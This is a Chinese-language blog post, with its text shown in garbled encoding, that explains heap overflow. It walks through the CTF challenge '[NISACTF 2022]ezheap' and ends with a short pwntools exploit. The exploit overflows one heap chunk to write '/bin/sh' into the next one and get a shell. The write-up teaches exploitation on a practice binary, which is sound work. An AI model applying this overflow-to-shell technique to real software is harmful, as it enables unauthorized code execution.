# å †æº¢å‡ºåˆ©ç”¨


## Heap Overflow

å †æº¢å‡ºçš„æ¦‚å¿µå…¶å®žå’Œæ ˆæº¢å‡ºã€ç¼“å†²åŒºæº¢å‡ºçš„æ¦‚å¿µéžå¸¸ç›¸ä¼¼ï¼Œè€Œä¸”å°±è¿žåˆ©ç”¨æ–¹å¼ä¹Ÿéžå¸¸ç›¸ä¼¼ï¼Œå› ä¸ºchunkä¹‹é—´æ˜¯è¿žç»­çš„ã€‚é‚£ä¹ˆåªè¦æœ‰`read`æˆ–è€…`get`å‡½æ•°çš„ä¸è§„èŒƒä½¿ç”¨ï¼Œä¾ç„¶å¯ä»¥é€šè¿‡å½“å‰çš„chunkä¿®æ”¹ç›¸é‚»chunkçš„å†…å®¹ã€‚ä½†æ˜¯è¿™ä¸ªå¨èƒå°±å°å¾ˆå¤šï¼Œå› ä¸ºheapä¸­ä¸ä¼šä¿å­˜ç¨‹åºè¿è¡Œçš„çŠ¶æ€å†…å®¹ï¼ŒåŸºæœ¬éƒ½æ˜¯ç”¨æˆ·æ•°æ®ï¼Œæ‰€ä»¥åœ¨heapä¸­æ²¡æœ‰åŠžæ³•åŠ«æŒç¨‹åºçš„è¿è¡Œæµç¨‹ï¼ˆPCå¯„å­˜å™¨ï¼‰ã€‚ä½†æ˜¯ï¼Œheapä¸­å¾€å¾€å­˜åœ¨ç”¨æˆ·æ•°æ®ï¼Œå¤å†™åŽå¯èƒ½å¯¼è‡´è¶Šæƒä¹‹ç±»çš„çŽ°è±¡å‡ºçŽ°ã€‚ä¸‹é¢ä»¥ä¸€ä¸ªéžå¸¸ç®€å•çš„exampleç†è§£heap overflowã€‚

## [NISACTF 2022]ezheap

ç¨‹åºå…¶å®žéžå¸¸ç®€å•ï¼Œå°±æ˜¯è¿žç»­calläº†ä¸¤ä¸ª0x16çš„mallocï¼Œç„¶åŽåªå¾€ç¬¬ä¸€ä¸ªchunkå†™æ•°æ®ï¼Œé€šè¿‡heap overflowè¦†å†™ç¬¬äºŒä¸ªchunkçš„æ•°æ®ï¼Œç„¶åŽåˆ©ç”¨systemå‡½æ•°getshellã€‚è¿™é‡Œæœ‰ä¸€ä¸ªè¦æ³¨æ„çš„ç‚¹æ˜¯ç”±äºŽæ˜¯i386ç¨‹åºï¼Œ0x16çš„mallocå®žé™…ä¸Šè¦å¯¹é½åˆ°0x20çš„ã€‚ç”±äºŽç›¸é‚»çš„ä¸¤ä¸ªchunkéƒ½æœ‰0x4çš„chunk_sizeï¼Œé‚£æˆ‘ä»¬è¾“å…¥0x20ä¸ªå­—ç¬¦å°±å¯ä»¥åˆšå¥½è¦†ç›–åˆ°ä¸‹ä¸€ä¸ªchunkçš„dataéƒ¨åˆ†ï¼Œå†™å…¥`/bin/sh`å³å¯ã€‚

æˆ‘ä»¬å…ˆè§‚å¯Ÿå†™å…¥å‰çš„chunksï¼š

![chunks](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172115171.png)

è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥0x21e29é‚£ä¸ªæ˜¯top chunkã€‚æˆ‘ä»¬å°†æ•°æ®å†™å…¥ï¼š

![overflow](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172406437.png)

è¿™è¾¹å°±å‘çŽ°ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ï¼Œå°±æ˜¯dataéƒ¨åˆ†å¹¶ä¸æ˜¯ç´§è·Ÿç€sizeçš„ã€‚è€Œæ˜¯ç©ºå‡ºäº†4ä¸ªå­—èŠ‚ã€‚æˆ‘ä»¬å†çœ‹ä¸‹åˆšå¥½è¾“å…¥0x16ä¸ªå­—èŠ‚çš„chunkæƒ…å†µï¼š

![normal](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172702754.png)

æˆ‘ä»¬å‘çŽ°å®ƒæ—¢åœ¨headerè¡¥äº†4å­—èŠ‚ï¼Œåˆåœ¨chunkçš„æœ«å°¾è¡¥äº†2å­—èŠ‚ðŸ¤£ã€‚è¿™ç§å¯¹é½çš„æ–¹å¼è¿˜æ˜¯æŒºè®©äººéš¾ä»¥æ‰æ‘¸çš„ã€‚ä¸ç®¡äº†ï¼Œåæ­£æœ€åŽæˆåŠŸgetshelläº†ã€‚

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231211172937995.png)

## Exploit

```python
from pwn import *

context.terminal=['tmux','splitw','-h']
elf = ELF('./pwn')
r = elf.process()
# r = remote('node5.anna.nssctf.cn',28186)

payload = b'a' * 0x20 + b'/bin/sh\x00'
r.recvuntil(b'Input:\n')
r.sendline(payload)

r.interactive()
```





---

> ä½œè€…: alextang  
> URL: https://alextang.top/articles/2023/12/heap_overflow/  

